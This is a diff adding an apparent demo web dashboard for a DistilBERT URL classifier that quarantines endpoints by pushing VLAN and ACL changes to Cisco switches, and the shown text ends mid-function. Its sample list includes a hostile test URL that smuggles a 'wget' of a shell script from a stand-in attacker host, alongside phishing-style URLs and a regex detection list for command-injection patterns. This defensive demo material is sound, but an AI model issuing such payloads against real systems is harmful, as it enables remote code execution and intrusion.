+        <div class="pstage" id="stage-2"><span class="ptick">✓</span><div class="pstep">02</div><div class="ptitle">WordPiece tokenize</div><div class="pdesc">Raw URL string is cleaned and split into sub-word tokens.</div></div>
+        <div class="pstage" id="stage-3"><span class="ptick">✓</span><div class="pstep">03</div><div class="ptitle">DistilBERT inference</div><div class="pdesc">Self-attention scores every token; runs on the Management Server.</div></div>
+        <div class="pstage" id="stage-4"><span class="ptick">✓</span><div class="pstep">04</div><div class="ptitle">Classification score</div><div class="pdesc">Softmax output → benign vs malicious probability.</div></div>
+        <div class="pstage" id="stage-5"><span class="ptick">✓</span><div class="pstep">05</div><div class="ptitle">Orchestration</div><div class="pdesc">Python pushes VLAN + ACL changes to the switch over SSH (Netmiko).</div></div>
+      </div>
+
+      <div class="pipe-detail">
+        <div class="pd-box">
+          <div class="pd-title">WordPiece tokens (suspicious sub-words highlighted)</div>
+          <div class="token-wrap" id="token-wrap"><span class="tok placeholder">run a classification to see tokens</span></div>
+        </div>
+        <div class="pd-box">
+          <div class="pd-title">Why the model flagged it — top attention weights</div>
+          <div id="attn-box"><div style="font-size:10px;color:var(--text3)">Attention map appears after a malicious verdict.</div></div>
+          <div class="pd-verdict" id="pd-verdict" style="margin-top:8px"></div>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <!-- ══════════ ENDPOINT (PC) SCREEN ══════════ -->
+  <div class="panel endpoint-panel">
+    <div class="panel-header">
+      <div class="panel-icon" style="background:rgba(45,212,191,0.12);color:var(--teal)">🖥️</div>
+      <span class="panel-title">Endpoint View — What the User Sees On Screen</span>
+      <span style="font-size:10px;color:var(--text3);margin-left:auto"><span id="ep-state-label" style="color:var(--success2)">Normal browsing</span></span>
+    </div>
+    <div class="panel-body">
+      <div class="ep-split">
+        <!-- The PC window -->
+        <div class="win">
+          <div class="win-titlebar">
+            <div class="win-os"><span class="winlogo"><span></span><span></span><span></span><span></span></span>Windows 11</div>
+            <span class="win-host" id="ep-host">ENG PC1</span>
+            <div class="win-ctrls"><i class="c1"></i><i class="c2"></i><i class="c3"></i></div>
+          </div>
+          <div class="bro-bar">
+            <div class="bro-nav">← → ⟳</div>
+            <div class="bro-addr">
+              <span class="bro-lock" id="ep-lock">🔒</span>
+              <span class="ep-url" id="ep-url">https://intranet.acme.local/home</span>
+            </div>
+            <span class="ep-badge ok" id="ep-badge">Secure</span>
+          </div>
+          <div class="ep-body normal" id="ep-body"></div>
+        </div>
+        <!-- Explainer -->
+        <div>
+          <div class="pd-box" style="margin-bottom:10px">
+            <div class="pd-title">What's happening here</div>
+            <div style="font-size:11px;color:var(--text2);line-height:1.6" id="ep-explain">
+              The endpoint browses normally on its department VLAN. Run a <b>malicious</b> URL to watch the screen flip to the captive "walled garden" the instant the host is quarantined.
+            </div>
+          </div>
+          <div class="pd-box">
+            <div class="pd-title">Endpoint state</div>
+            <div class="wall-row"><span class="k">Host</span><span class="v" id="ep-x-host">ENG PC1</span></div>
+            <div class="wall-row"><span class="k">Current VLAN</span><span class="v" id="ep-x-vlan">VLAN 10 (Engineering)</span></div>
+            <div class="wall-row"><span class="k">Internet access</span><span class="v" id="ep-x-net">Allowed</span></div>
+            <div class="wall-row"><span class="k">Gateway</span><span class="v" id="ep-x-gw">10.10.0.1</span></div>
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <!-- ══════════ ORCHESTRATION CONSOLE ══════════ -->
+  <div class="panel endpoint-panel">
+    <div class="panel-header">
+      <div class="panel-icon" style="background:rgba(45,212,191,0.12);color:var(--teal)">⌥</div>
+      <span class="panel-title">Orchestration Console — Config Pushed to Cisco Appliances</span>
+      <span style="font-size:10px;color:var(--text3);margin-left:auto">Bridge: <span style="color:var(--text2)">Python · Netmiko over SSH</span></span>
+    </div>
+    <div class="panel-body">
+      <div class="orch-meta">
+        <span class="orch-badge" id="orch-status">Idle — no action pushed</span>
+        <div class="orch-actions">
+          <button class="btn-ghost" id="restore-btn" onclick="restoreHost()" disabled>▶ Verify &amp; restore host</button>
+          <button class="btn-ghost" onclick="clearConsole()">Clear console</button>
+        </div>
+      </div>
+      <div class="terminal" id="orch-terminal"><div class="term-line c-muted"># Orchestrator standing by. A malicious verdict pushes the isolation config here.</div></div>
+    </div>
+  </div>
+
+  <!-- ══════════ NETWORK TOPOLOGY ══════════ -->
+  <div class="panel topo-panel">
+    <div class="panel-header">
+      <div class="panel-icon" style="background:rgba(45,212,191,0.12);color:var(--teal)">🌐</div>
+      <span class="panel-title">Network Topology — Cisco Catalyst Switches + ASA Firewall</span>
+      <span style="font-size:10px;color:var(--text3);margin-left:auto">Live state: <span id="topo-state-label" style="color:var(--success2)">All clear</span></span>
+    </div>
+    <div class="topo-container">
+      <svg id="topo-svg" viewBox="0 0 1040 560" xmlns="http://www.w3.org/2000/svg">
+        <defs>
+          <marker id="arr" viewBox="0 0 10 10" refX="8" refY="5" markerWidth="5" markerHeight="5" orient="auto-start-reverse">
+            <path d="M2 1L8 5L2 9" fill="none" stroke="context-stroke" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"/>
+          </marker>
+          <marker id="arr-d" viewBox="0 0 10 10" refX="8" refY="5" markerWidth="5" markerHeight="5" orient="auto-start-reverse">
+            <path d="M2 1L8 5L2 9" fill="none" stroke="#f472b6" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"/>
+          </marker>
+          <marker id="arr-m" viewBox="0 0 10 10" refX="8" refY="5" markerWidth="5" markerHeight="5" orient="auto-start-reverse">
+            <path d="M2 1L8 5L2 9" fill="none" stroke="#a78bfa" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"/>
+          </marker>
+          <filter id="glow" x="-60%" y="-60%" width="220%" height="220%">
+            <feGaussianBlur stdDeviation="1.8" result="b"/>
+            <feMerge><feMergeNode in="b"/><feMergeNode in="SourceGraphic"/></feMerge>
+          </filter>
+        </defs>
+
+        <!-- ════ ZONE BACKGROUNDS ════ -->
+        <rect class="zone-dmz"  x="20"  y="90"  width="200" height="345" rx="10"/>
+        <text class="zone-label dmz"  x="120" y="108">DMZ Zone</text>
+
+        <rect id="zone-mgmt" class="zone-mgmt" x="730" y="90"  width="295" height="195" rx="10"/>
+        <text class="zone-label mgmt" x="877" y="108">VLAN 100 Management · DistilBERT engine</text>
+
+        <rect id="zone-eng"  class="zone-vlan selected" x="310" y="305" width="130" height="175" rx="8"/>
+        <text class="zone-label vlan" x="375" y="323">VLAN 10 Eng</text>
+
+        <rect id="zone-fin" class="zone-vlan" x="465" y="305" width="130" height="175" rx="8"/>
+        <text class="zone-label vlan" x="530" y="323">VLAN 20 Fin</text>
+
+        <rect id="zone-hr" class="zone-vlan" x="620" y="305" width="130" height="175" rx="8"/>
+        <text class="zone-label vlan" x="685" y="323">VLAN 30 HR</text>
+
+        <rect id="zone-qnt"  class="zone-qnt"  x="800" y="305" width="225" height="215" rx="8"/>
+        <text class="zone-label qnt"  x="912" y="323">VLAN 999 Quarantine</text>
+
+        <!-- ════ BACKBONE LINKS ════ -->
+        <line class="link" x1="520" y1="62" x2="520" y2="82" marker-end="url(#arr)"/>
+        <line class="link" x1="520" y1="118" x2="520" y2="151" marker-end="url(#arr)"/>
+        <line class="link" x1="520" y1="193" x2="520" y2="219" marker-end="url(#arr)"/>
+        <polyline class="link" points="488,230 110,230 110,265" marker-end="url(#arr)"/>
+        <polyline class="link" points="552,230 790,230 790,225" marker-end="url(#arr)"/>
+        <line class="link" x1="505" y1="241" x2="375" y2="335" marker-end="url(#arr)"/>
+        <line class="link" x1="520" y1="241" x2="530" y2="335" marker-end="url(#arr)"/>
+        <line class="link" x1="535" y1="241" x2="685" y2="335" marker-end="url(#arr)"/>
+
+        <!-- Mirror-to-model link (appears during inference) -->
+        <path id="mirror-link" class="link-mirror" d="M540 232 L790 232 L790 200 L810 178" marker-end="url(#arr-m)"/>
+        <!-- Quarantine animated link (hidden until triggered) -->
+        <path id="qnt-link" class="link-qnt" d="M548 240 Q710 270 900 340" marker-end="url(#arr-d)"/>
+
+        <!-- ── DMZ internal ── -->
+        <line class="link" x1="110" y1="285" x2="110" y2="310"/>
+        <line class="link" x1="60"  y1="310" x2="160" y2="310"/>
+        <line class="link" x1="60"  y1="310" x2="60"  y2="336" marker-end="url(#arr)"/>
+        <line class="link" x1="110" y1="310" x2="110" y2="336" marker-end="url(#arr)"/>
+        <line class="link" x1="160" y1="310" x2="160" y2="336" marker-end="url(#arr)"/>
+
+        <!-- ── MGMT internal ── -->
+        <line class="link" x1="790" y1="225" x2="790" y2="190"/>
+        <line class="link" x1="790" y1="190" x2="940" y2="190"/>
+        <line class="link" x1="810" y1="190" x2="810" y2="148" marker-end="url(#arr)"/>
+        <line class="link" x1="940" y1="190" x2="940" y2="148" marker-end="url(#arr)"/>
+
+        <!-- ── VLAN SW → PC links ── -->
+        <line class="link" x1="375" y1="345" x2="375" y2="411" marker-end="url(#arr)"/>
+        <line class="link" x1="530" y1="345" x2="530" y2="411" marker-end="url(#arr)"/>
+        <line class="link" x1="685" y1="345" x2="685" y2="411" marker-end="url(#arr)"/>
+
+        <!-- ── QNT SW → Infected Host ── -->
+        <line class="link" x1="910" y1="350" x2="910" y2="416" marker-end="url(#arr)"/>
+
+        <!-- ════ INTERNET CLOUD ════ -->
+        <g transform="translate(520,38)">
+          <ellipse cx="0"   cy="-15" rx="36" ry="16" fill="rgba(148,163,184,0.10)" stroke="#64748b" stroke-width="1"/>
+          <ellipse cx="-22" cy="-7"  rx="20" ry="14" fill="rgba(148,163,184,0.10)" stroke="#64748b" stroke-width="1"/>
+          <ellipse cx="22"  cy="-7"  rx="20" ry="14" fill="rgba(148,163,184,0.10)" stroke="#64748b" stroke-width="1"/>
+          <rect x="-38" y="-5" width="76" height="10" fill="rgba(148,163,184,0.10)" stroke="none"/>
+          <text class="node-label" y="14" style="font-size:8px">Internet</text>
+        </g>
+
+        <!-- ════ EDGE ROUTER R1 ════ -->
+        <g transform="translate(520,100)">
+          <circle cx="0" cy="0" r="18" fill="rgba(59,130,246,0.12)" stroke="#3b82f6" stroke-width="1"/>
+          <line x1="-11" y1="0" x2="11" y2="0" stroke="#60a5fa" stroke-width="1.5"/>
+          <polygon points="11,0 7,-3 7,3"   fill="#60a5fa"/>
+          <polygon points="-11,0 -7,-3 -7,3" fill="#60a5fa"/>
+          <text class="node-label" y="30" style="fill:#60a5fa">R1 Edge Router</text>
+        </g>
+
+        <!-- ════ ASA FIREWALL ════ -->
+        <g transform="translate(520,165)">
+          <rect x="-22" y="-14" width="44" height="28" rx="3" fill="rgba(245,158,11,0.12)" stroke="#f59e0b" stroke-width="1"/>
+          <line x1="-22" y1="14"  x2="22" y2="-14" stroke="#f59e0b" stroke-width="0.8" opacity="0.5"/>
+          <line x1="-22" y1="-14" x2="22" y2="14"  stroke="#f59e0b" stroke-width="0.8" opacity="0.5"/>
+          <text class="node-label" y="24" style="fill:#d97706">ASA Firewall</text>
+        </g>
+
+        <!-- ════ CORE L2 SWITCH ════ -->
+        <g transform="translate(520,230)">
+          <rect x="-32" y="-11" width="64" height="22" rx="3" fill="rgba(45,212,191,0.12)" stroke="#2dd4bf" stroke-width="1"/>
+          <circle cx="-18" cy="5" r="3" fill="#2dd4bf" opacity="0.7"/>
+          <circle cx="-6"  cy="5" r="3" fill="#2dd4bf" opacity="0.7"/>
+          <circle cx="6"   cy="5" r="3" fill="#2dd4bf" opacity="0.7"/>
+          <circle cx="18"  cy="5" r="3" fill="#2dd4bf" opacity="0.7"/>
+          <text class="node-label" y="22" style="fill:#0d9488">Core L2 Switch · mirror port</text>
+        </g>
+
+        <!-- ════ DMZ SWITCH ════ -->
+        <g transform="translate(110,275)">
+          <rect x="-22" y="-10" width="44" height="20" rx="3" fill="rgba(34,197,94,0.12)" stroke="#22c55e" stroke-width="1"/>
+          <circle cx="-10" cy="4" r="2.5" fill="#22c55e" opacity="0.7"/>
+          <circle cx="-2"  cy="4" r="2.5" fill="#22c55e" opacity="0.7"/>
+          <circle cx="6"   cy="4" r="2.5" fill="#22c55e" opacity="0.7"/>
+          <text class="node-label" y="20">DMZ SW</text>
+        </g>
+
+        <!-- DMZ Servers -->
+        <g transform="translate(60,350)">
+          <rect class="node-body" x="-22" y="-14" width="44" height="28" rx="2" stroke="#22c55e" stroke-width="0.8"/>
+          <rect x="-12" y="-9"  width="24" height="14" rx="1" fill="rgba(34,197,94,0.18)"/>
+          <rect x="-5"  y="6"   width="10" height="3"  rx="1" fill="rgba(34,197,94,0.4)"/>
+          <text class="node-label" y="23" style="font-size:8px">Web Srv</text>
+        </g>
+        <g transform="translate(110,350)">
+          <rect class="node-body" x="-22" y="-14" width="44" height="28" rx="2" stroke="#22c55e" stroke-width="0.8"/>
+          <rect x="-12" y="-9"  width="24" height="14" rx="1" fill="rgba(34,197,94,0.18)"/>
+          <rect x="-5"  y="6"   width="10" height="3"  rx="1" fill="rgba(34,197,94,0.4)"/>
+          <text class="node-label" y="23" style="font-size:8px">DNS Srv</text>
+        </g>
+        <g transform="translate(160,350)">
+          <rect class="node-body" x="-22" y="-14" width="44" height="28" rx="2" stroke="#22c55e" stroke-width="0.8"/>
+          <rect x="-12" y="-9"  width="24" height="14" rx="1" fill="rgba(34,197,94,0.18)"/>
+          <rect x="-5"  y="6"   width="10" height="3"  rx="1" fill="rgba(34,197,94,0.4)"/>
+          <text class="node-label" y="23" style="font-size:8px">Mail Srv</text>
+        </g>
+
+        <!-- ════ MGMT SWITCH ════ -->
+        <g transform="translate(790,235)">
+          <rect x="-22" y="-10" width="44" height="20" rx="3" fill="rgba(167,139,250,0.14)" stroke="#a78bfa" stroke-width="1"/>
+          <circle cx="-10" cy="4" r="2.5" fill="#a78bfa" opacity="0.7"/>
+          <circle cx="-2"  cy="4" r="2.5" fill="#a78bfa" opacity="0.7"/>
+          <circle cx="6"   cy="4" r="2.5" fill="#a78bfa" opacity="0.7"/>
+          <text class="node-label" y="20" style="fill:#a78bfa">MGMT SW</text>
+        </g>
+
+        <!-- Remediation Server -->
+        <g transform="translate(940,161)">
+          <rect class="node-body" x="-22" y="-14" width="44" height="28" rx="2" stroke="#a78bfa" stroke-width="0.8"/>
+          <rect x="-12" y="-9"  width="24" height="14" rx="1" fill="rgba(167,139,250,0.25)"/>
+          <rect x="-5"  y="6"   width="10" height="3"  rx="1" fill="rgba(167,139,250,0.4)"/>
+          <text class="node-label" y="23"  style="fill:#a78bfa;font-size:8px">Remediation</text>
+          <text class="node-label" y="33" style="fill:#9d7fea;font-size:7px">(captive portal)</text>
+        </g>
+
+        <!-- Management Server — MODEL HOST (highlighted) -->
+        <g id="model-host" transform="translate(810,161)">
+          <rect class="node-body" x="-24" y="-15" width="48" height="30" rx="3" stroke="#a78bfa" stroke-width="1.4"/>
+          <rect x="-12" y="-9"  width="24" height="14" rx="1" fill="rgba(167,139,250,0.30)"/>
+          <rect x="-5"  y="6"   width="10" height="3"  rx="1" fill="rgba(167,139,250,0.5)"/>
+          <text x="0" y="-3" text-anchor="middle" style="font-size:8px;font-weight:700;fill:#a78bfa;font-family:var(--font)">SLM</text>
+          <text class="node-label" y="24" style="fill:#a78bfa;font-size:8px;font-weight:700">MGMT Srv</text>
+          <text class="node-label" y="34" style="fill:#9d7fea;font-size:7px">DistilBERT model</text>
+          <g id="model-pulse" opacity="0">
+            <circle cx="0" cy="0" r="22" fill="none" stroke="#a78bfa" stroke-width="1.4">
+              <animate attributeName="r" values="18;30;18" dur="1.3s" repeatCount="indefinite"/>
+              <animate attributeName="opacity" values="0.8;0;0.8" dur="1.3s" repeatCount="indefinite"/>
+            </circle>
+          </g>
+        </g>
+
+        <!-- ════ ENG ════ -->
+        <g transform="translate(375,335)">
+          <rect x="-22" y="-10" width="44" height="20" rx="3" fill="rgba(56,189,248,0.12)" stroke="#38bdf8" stroke-width="1"/>
+          <circle cx="-10" cy="4" r="2.5" fill="#38bdf8" opacity="0.7"/>
+          <circle cx="-2"  cy="4" r="2.5" fill="#38bdf8" opacity="0.7"/>
+          <circle cx="6"   cy="4" r="2.5" fill="#38bdf8" opacity="0.7"/>
+          <text class="node-label" y="20" style="fill:#38bdf8">ENG SW</text>
+        </g>
+        <g id="eng-pc" class="infected-pc" transform="translate(375,425)">
+          <rect id="eng-pc-rect" class="node-body" x="-22" y="-14" width="44" height="28" rx="2" stroke="#38bdf8" stroke-width="1"/>
+          <rect x="-12" y="-9"  width="24" height="14" rx="1" fill="rgba(56,189,248,0.15)"/>
+          <rect x="-5"  y="6"   width="10" height="3"  rx="1" fill="#38bdf8" opacity="0.4"/>
+          <rect x="-11" y="10"  width="22" height="2"  rx="1" fill="#38bdf8" opacity="0.25"/>
+          <text class="node-label" y="24" style="fill:#38bdf8;font-size:8px">ENG PC1</text>
+          <g id="tip-eng" class="topo-tooltip">
+            <rect x="-90" y="-50" width="180" height="30" rx="5" fill="rgba(244,114,182,0.2)" stroke="#f472b6" stroke-width="0.7"/>
+            <text x="0" y="-35" text-anchor="middle" style="font-size:8px;fill:#ec4899">🔒 Walled garden active</text>
+            <text x="0" y="-25" text-anchor="middle" style="font-size:7px;fill:#f472b6">Restricted to remediation portal only</text>
+          </g>
+        </g>
+
+        <!-- ════ FIN ════ -->
+        <g transform="translate(530,335)">
+          <rect x="-22" y="-10" width="44" height="20" rx="3" fill="rgba(56,189,248,0.12)" stroke="#38bdf8" stroke-width="1"/>
+          <circle cx="-10" cy="4" r="2.5" fill="#38bdf8" opacity="0.7"/>
+          <circle cx="-2"  cy="4" r="2.5" fill="#38bdf8" opacity="0.7"/>
+          <circle cx="6"   cy="4" r="2.5" fill="#38bdf8" opacity="0.7"/>
+          <text class="node-label" y="20" style="fill:#38bdf8">FIN SW</text>
+        </g>
+        <g id="fin-pc" class="infected-pc" transform="translate(530,425)">
+          <rect id="fin-pc-rect" class="node-body" x="-22" y="-14" width="44" height="28" rx="2" stroke="#38bdf8" stroke-width="1"/>
+          <rect x="-12" y="-9"  width="24" height="14" rx="1" fill="rgba(56,189,248,0.15)"/>
+          <rect x="-5"  y="6"   width="10" height="3"  rx="1" fill="#38bdf8" opacity="0.4"/>
+          <rect x="-11" y="10"  width="22" height="2"  rx="1" fill="#38bdf8" opacity="0.25"/>
+          <text class="node-label" y="24" style="fill:#38bdf8;font-size:8px">FIN PC1</text>
+          <g id="tip-fin" class="topo-tooltip">
+            <rect x="-90" y="-50" width="180" height="30" rx="5" fill="rgba(244,114,182,0.2)" stroke="#f472b6" stroke-width="0.7"/>
+            <text x="0" y="-35" text-anchor="middle" style="font-size:8px;fill:#ec4899">🔒 Walled garden active</text>
+            <text x="0" y="-25" text-anchor="middle" style="font-size:7px;fill:#f472b6">Restricted to remediation portal only</text>
+          </g>
+        </g>
+
+        <!-- ════ HR ════ -->
+        <g transform="translate(685,335)">
+          <rect x="-22" y="-10" width="44" height="20" rx="3" fill="rgba(56,189,248,0.12)" stroke="#38bdf8" stroke-width="1"/>
+          <circle cx="-10" cy="4" r="2.5" fill="#38bdf8" opacity="0.7"/>
+          <circle cx="-2"  cy="4" r="2.5" fill="#38bdf8" opacity="0.7"/>
+          <circle cx="6"   cy="4" r="2.5" fill="#38bdf8" opacity="0.7"/>
+          <text class="node-label" y="20" style="fill:#38bdf8">HR SW</text>
+        </g>
+        <g id="hr-pc" class="infected-pc" transform="translate(685,425)">
+          <rect id="hr-pc-rect" class="node-body" x="-22" y="-14" width="44" height="28" rx="2" stroke="#38bdf8" stroke-width="1"/>
+          <rect x="-12" y="-9"  width="24" height="14" rx="1" fill="rgba(56,189,248,0.15)"/>
+          <rect x="-5"  y="6"   width="10" height="3"  rx="1" fill="#38bdf8" opacity="0.4"/>
+          <rect x="-11" y="10"  width="22" height="2"  rx="1" fill="#38bdf8" opacity="0.25"/>
+          <text class="node-label" y="24" style="fill:#38bdf8;font-size:8px">HR PC1</text>
+          <g id="tip-hr" class="topo-tooltip">
+            <rect x="-90" y="-50" width="180" height="30" rx="5" fill="rgba(244,114,182,0.2)" stroke="#f472b6" stroke-width="0.7"/>
+            <text x="0" y="-35" text-anchor="middle" style="font-size:8px;fill:#ec4899">🔒 Walled garden active</text>
+            <text x="0" y="-25" text-anchor="middle" style="font-size:7px;fill:#f472b6">Restricted to remediation portal only</text>
+          </g>
+        </g>
+
+        <!-- ════ QNT ════ -->
+        <g transform="translate(910,340)">
+          <rect x="-22" y="-10" width="44" height="20" rx="3" fill="rgba(244,114,182,0.12)" stroke="#f472b6" stroke-width="1"/>
+          <circle cx="-10" cy="4" r="2.5" fill="#f472b6" opacity="0.7"/>
+          <circle cx="-2"  cy="4" r="2.5" fill="#f472b6" opacity="0.7"/>
+          <circle cx="6"   cy="4" r="2.5" fill="#f472b6" opacity="0.7"/>
+          <text class="node-label" y="20" style="fill:#ec4899">QNT SW</text>
+        </g>
+        <g id="infected-host" transform="translate(910,430)" opacity="0.3" style="transition:opacity 0.6s">
+          <rect class="node-body" x="-22" y="-14" width="44" height="28" rx="2" stroke="#f472b6" stroke-width="1"/>
+          <rect x="-12" y="-9"  width="24" height="14" rx="1" fill="rgba(244,114,182,0.15)"/>
+          <rect x="-5"  y="6"   width="10" height="3"  rx="1" fill="#f472b6" opacity="0.4"/>
+          <rect x="-11" y="10"  width="22" height="2"  rx="1" fill="#f472b6" opacity="0.25"/>
+          <text class="node-label" y="24" style="fill:#ec4899;font-size:8px">Infected Host</text>
+        </g>
+
+        <!-- packet animation layer (on top) -->
+        <g id="packet-layer"></g>
+
+        <!-- Verify & restore hint -->
+        <g id="reset-hint" opacity="0" style="transition:opacity 0.4s">
+          <rect x="20" y="525" width="158" height="20" rx="10" fill="rgba(34,197,94,0.15)" stroke="rgba(34,197,94,0.4)" stroke-width="0.7" style="cursor:pointer" onclick="restoreHost()"/>
+          <text x="99" y="539" text-anchor="middle" style="font-size:9px;fill:#16a34a;cursor:pointer" onclick="restoreHost()">▶  Verify &amp; restore host</text>
+        </g>
+
+      </svg>
+      <div class="topo-legend">
+        <span class="tl-item"><span class="tl-dot" style="background:#60a5fa"></span>Request / response traffic</span>
+        <span class="tl-item"><span class="tl-dot" style="background:#a78bfa"></span>Mirrored copy to model</span>
+        <span class="tl-item"><span class="tl-dot" style="background:#f472b6"></span>Quarantine migration</span>
+      </div>
+    </div>
+  </div>
+
+  <!-- CHARTS + LOG -->
+  <div class="chart-area">
+    <div class="panel">
+      <div class="panel-header">
+        <div class="panel-icon" style="background:rgba(245,158,11,0.12);color:var(--warn)">📊</div>
+        <span class="panel-title">MTTR Comparison — Automated vs Manual</span>
+      </div>
+      <div class="panel-body">
+        <div style="display:flex;gap:16px;margin-bottom:10px;font-size:10px;color:var(--text3)">
+          <span style="display:flex;align-items:center;gap:4px"><span style="width:10px;height:10px;border-radius:2px;background:#3b82f6;display:inline-block"></span>Automated SLM (ms)</span>
+          <span style="display:flex;align-items:center;gap:4px"><span style="width:10px;height:10px;border-radius:2px;background:#64748b;display:inline-block"></span>Manual SOC (~15 min)</span>
+        </div>
+        <div style="position:relative;width:100%;height:200px">
+          <canvas id="mttr-chart" role="img" aria-label="MTTR comparison bar chart showing automated SLM response vs manual SOC response"></canvas>
+        </div>
+      </div>
+    </div>
+    <div class="panel">
+      <div class="panel-header">
+        <div class="panel-icon" style="background:rgba(34,197,94,0.1);color:var(--success)">📋</div>
+        <span class="panel-title">Event Timeline &amp; Detection Log</span>
+        <button onclick="clearLog()" style="margin-left:auto;background:none;border:1px solid var(--border);border-radius:5px;color:var(--text3);font-size:10px;padding:3px 8px;cursor:pointer">Clear</button>
+      </div>
+      <div class="panel-body" style="padding:8px 12px">
+        <div class="timeline" id="event-log">
+          <div class="log-entry">
+            <span class="log-time">--:--:--</span>
+            <div class="log-dot sys"></div>
+            <span class="log-text">System initialised. DistilBERT classification engine ready. Awaiting URL input.</span>
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+
+</div><!-- end .main -->
+
+<script src="https://cdnjs.cloudflare.com/ajax/libs/Chart.js/4.4.1/chart.umd.js"></script>
+<script>
+const SVGNS='http://www.w3.org/2000/svg';
+const reduceMotion = window.matchMedia('(prefers-reduced-motion: reduce)').matches;
+
+const state = {
+  totalURLs:0, maliciousCount:0, benignCount:0, mttrSamples:[],
+  backendLive:false,
+  backendURL:'https://your-username-spacename.hf.space/predict',
+  localURL:'http://localhost:7860/predict'
+};
+
+/* ── Department metadata ── */
+const DEPTS = {
+  eng:{ key:'eng', name:'ENG PC1', dept:'Engineering', vlan:'VLAN 10', vlanFull:'VLAN 10 (Engineering)', gw:'10.10.0.1',
+        ip:'10.10.0.45', sw:'ENG-SW', swModel:'Cisco Catalyst 2960', iface:'GigabitEthernet0/3', vlanId:10,
+        zone:'zone-eng', pcRect:'eng-pc-rect', tip:'tip-eng', pcx:375, swy:345, pcTop:411, quarantined:false },
+  fin:{ key:'fin', name:'FIN PC1', dept:'Finance', vlan:'VLAN 20', vlanFull:'VLAN 20 (Finance)', gw:'10.20.0.1',
+        ip:'10.20.0.32', sw:'FIN-SW', swModel:'Cisco Catalyst 2960', iface:'GigabitEthernet0/2', vlanId:20,
+        zone:'zone-fin', pcRect:'fin-pc-rect', tip:'tip-fin', pcx:530, swy:345, pcTop:411, quarantined:false },
+  hr: { key:'hr',  name:'HR PC1',  dept:'Human Resources', vlan:'VLAN 30', vlanFull:'VLAN 30 (Human Resources)', gw:'10.30.0.1',
+        ip:'10.30.0.51', sw:'HR-SW', swModel:'Cisco Catalyst 2960', iface:'GigabitEthernet0/4', vlanId:30,
+        zone:'zone-hr',  pcRect:'hr-pc-rect',  tip:'tip-hr',  pcx:685, swy:345, pcTop:411, quarantined:false }
+};
+const QNT_VLAN=999, REMED_IP='10.99.0.1', ASA='ASA-FW', ASA_MODEL='Cisco ASA 5506-X';
+let activeDept = 'eng';
+
+/* ════════ THEME ════════ */
+function toggleTheme(){
+  const html=document.documentElement;
+  const next = html.dataset.theme==='dark' ? 'light' : 'dark';
+  html.dataset.theme = next;
+  document.getElementById('tt-icon').textContent = next==='dark' ? '🌙' : '☀️';
+  document.getElementById('tt-label').textContent = next==='dark' ? 'Dark' : 'Light';
+  if(window.__mttrChart) restyleChart();
+}
+
+/* ════════ SAMPLES ════════ */
+const SAMPLES = [
+  {url:'https://google.com',type:'ben'},
+  {url:'https://github.com/torvalds/linux',type:'ben'},
+  {url:'https://stackoverflow.com/questions/ask',type:'ben'},
+  {url:'http://192.168.1.1/admin/exec.php?cmd=wget+http://evil.cc/shell.sh',type:'mal'},
+  {url:'http://paypa1-security-verify.tk/login.php?redirect=steal',type:'mal'},
+  {url:'http://free-iphone15-winner.xyz/claim?ref=phish&token=abc123',type:'mal'},
+  {url:'https://docs.microsoft.com/en-us/azure/security/',type:'ben'},
+  {url:'http://update-adobe-flash-now.ru/malware.exe?src=dga',type:'mal'},
+];
+function buildSamples(){
+  const grid=document.getElementById('sample-grid');
+  SAMPLES.forEach(s=>{
+    const btn=document.createElement('button');
+    btn.className='sample-btn '+s.type;
+    btn.title=s.url;
+    btn.textContent=s.url.replace(/^https?:\/\//,'').substring(0,45)+(s.url.length>50?'…':'');
+    btn.onclick=()=>{document.getElementById('url-input').value=s.url;classifyURL();};
+    grid.appendChild(btn);
+  });
+}
+
+/* ════════ DEPARTMENT SELECTION ════════ */
+function selectDept(key){
+  if(!DEPTS[key]) return;
+  // lift any existing quarantine for a clean demo
+  resetTopology(true);
+  activeDept = key;
+  document.querySelectorAll('.dept-tab').forEach(t=>t.classList.toggle('active', t.dataset.dept===key));
+  ['eng','fin','hr'].forEach(k=>{
+    const z=document.getElementById(DEPTS[k].zone);
+    z.classList.toggle('selected', k===key);
+  });
+  const d=DEPTS[key];
+  document.getElementById('ep-host').textContent=d.name;
+  setEndpoint('idle');
+  addLog('sys', `Target endpoint set to ${d.name} (${d.vlanFull}).`);
+}
+
+/* ════════ HEURISTIC CLASSIFIER ════════ */
+const MAL_PATTERNS=[
+  /\.(tk|xyz|ru|cc|ga|ml|cf|gq)\b/i,
+  /phish|malware|hack|exploit|steal|virus|trojan|worm|botnet|c2|shell/i,
+  /free.*(iphone|winner|prize|gift)/i,
+  /paypa[l1]|amaz0n|g00gle|micros0ft|app1e/i,
+  /\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}.*\/(admin|exec|cmd|shell)/i,
+  /cmd=|shell=|exec=|wget.*http/i,
+  /\.exe\?|\.bat\?|\.ps1\?/i,
+  /update.*flash.*now/i
+];
+function heuristicClassify(url){
+  let score=0;
+  MAL_PATTERNS.forEach(r=>{if(r.test(url))score++;});
+  if(/^https?:\/\/\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}/.test(url))score++;
+  const isMal=score>=1;
+  const conf=isMal
+    ?Math.min(0.96,0.65+score*0.1+Math.random()*0.05)
+    :Math.max(0.70,0.88+Math.random()*0.04);
+  return{label:isMal?'malicious':'benign',confidence:parseFloat(conf.toFixed(4))};
+}
+
+async function callBackend(url){
+  for(const ep of[state.backendURL,state.localURL]){
+    try{
+      const r=await fetch(ep,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({url}),signal:AbortSignal.timeout(4000)});
+      if(r.ok){const d=await r.json();if(!state.backendLive){state.backendLive=true;setBackendStatus(true);}return d;}
+    }catch{}
+  }
+  return null;
+}
+async function pingBackend(){
+  addLog('sys','Attempting to connect to DistilBERT backend…');
+  const r=await callBackend('https://google.com');
+  if(r){setBackendStatus(true);addLog('sys','DistilBERT backend connected. Live model active.');}
+  else{addLog('sys','Backend unreachable. Heuristic mode active. Start app.py to connect live model.');}
+}
+function setBackendStatus(live){
+  state.backendLive=live;
+  document.getElementById('backend-dot').className='backend-indicator '+(live?'live':'heuristic');
+  document.getElementById('backend-text').innerHTML=live
